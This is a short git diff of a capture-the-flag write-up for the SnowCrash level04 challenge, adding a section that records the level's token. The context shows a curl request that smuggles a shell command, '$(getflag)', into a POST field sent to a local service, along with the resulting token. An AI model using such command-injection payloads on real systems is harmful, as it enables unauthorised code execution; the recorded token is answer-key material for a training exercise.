@@ -34,3 +34,7 @@ So we can use echo to execute commands inside the server such as:
 level04@SnowCrash:~$ curl -s -X POST -d 'x="$(getflag)"' localhost:4747
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
+
+## Token
+
+ne2searoevaevoem4ov4ar8ap
